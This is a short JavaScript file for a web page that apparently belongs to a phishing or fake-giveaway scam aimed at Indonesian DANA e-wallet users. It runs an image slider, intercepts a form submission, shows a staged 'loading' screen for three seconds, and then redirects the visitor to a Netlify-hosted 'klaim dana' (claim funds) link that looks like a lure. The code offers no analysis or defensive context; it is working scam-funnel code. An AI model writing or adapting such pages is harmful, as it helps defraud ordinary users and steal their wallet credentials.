document.addEventListener('DOMContentLoaded', function() {
    // Initialize slider
    $('.slider').slick({
        autoplay: true,
        autoplaySpeed: 600,
        arrows: false,
        dots: false,
        infinite: true,
        speed: 500,
        fade: true,
        cssEase: 'linear'
    });

    // Form submission handler
    document.getElementById('patok').addEventListener('submit', function(event) {
        event.preventDefault();
        
        // Show loading
        document.getElementById('process1').style.display = 'flex';
        
        // Simulate loading process (3 seconds)
        setTimeout(function() {
            // Redirect to the target link
            window.location.href = "https://link-klaim-dana-id-indonesia.netlify.app/";
        }, 3000);
    });
});
